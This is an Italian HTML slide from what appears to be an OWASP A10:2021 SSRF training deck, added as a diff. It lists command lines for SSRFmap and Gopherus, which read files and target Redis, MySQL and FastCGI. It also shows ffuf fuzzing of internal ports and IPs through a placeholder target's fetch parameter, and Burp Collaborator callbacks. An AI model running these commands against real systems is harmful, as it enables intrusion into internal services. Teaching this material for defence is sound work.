@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A10:2021 - Strumenti Automatici</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🔧 Strumenti Automatici per SSRF</h1>
+        <div class="subtitle">Automatizzare discovery, bypass e exploitation</div>
+
+        <div class="grid-2-col">
+            <div class="card border-red">
+                <div class="card-title">🗺️ SSRFmap</div>
+                <div class="card-text">
+                    Framework SSRF completo con moduli per vari servizi:
+                    <div class="code-box"># Installazione
+git clone https://github.com/swisskyrepo/SSRFmap
+cd SSRFmap && pip3 install -r requirements.txt
+
+# Uso base
+python3 ssrfmap.py -r request.txt -p url -m portscan
+
+# Moduli disponibili
+python3 ssrfmap.py -r request.txt -p url -m readfiles
+python3 ssrfmap.py -r request.txt -p url -m redis
+python3 ssrfmap.py -r request.txt -p url -m mysql</div>
+                </div>
+            </div>
+
+            <div class="card border-purple">
+                <div class="card-title">🐿️ Gopherus</div>
+                <div class="card-text">
+                    Genera payload gopher:// per vari servizi:
+                    <div class="code-box"># Installazione
+git clone https://github.com/tarunkant/Gopherus
+cd Gopherus
+
+# Genera payload per Redis
+python gopherus.py --exploit redis
+
+# Genera payload per MySQL
+python gopherus.py --exploit mysql
+
+# Genera payload per FastCGI
+python gopherus.py --exploit fastcgi</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-blue">
+                <div class="card-title">🔍 ffuf + Wordlist</div>
+                <div class="card-text">
+                    Fuzzing per trovare endpoint interni:
+                    <div class="code-box"># Port scanning con ffuf
+ffuf -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ" \
+  -w ports.txt -mc all -fc 500
+
+# Fuzzing IP interni
+ffuf -u "http://target.com/fetch?url=http://192.168.1.FUZZ" \
+  -w numbers.txt -mc 200
+
+# Bypass techniques
+ffuf -u "http://target.com/fetch?url=FUZZ" \
+  -w ssrf-bypass.txt</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">🎯 Burp Suite</div>
+                <div class="card-text">
+                    Collaborator + Intruder per SSRF:
+                    <div class="code-box"># 1. Genera Burp Collaborator URL
+#    → xxxxx.burpcollaborator.net
+
+# 2. Usa Intruder con payload
+http://127.0.0.1:§port§
+http://§ip§.burpcollaborator.net
+
+# 3. Controlla Collaborator per
+#    callback (conferma SSRF blind)</div>
+                    <br>
+                    <strong>Estensioni utili:</strong> Collaborator Everywhere, SSRF King
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 20px;">
+            <div class="card-title">📦 Installazione Rapida</div>
+            <div class="card-text">
+                <div class="code-box">pip3 install ssrfmap gopherus
+apt install ffuf  # Kali Linux</div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 8;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
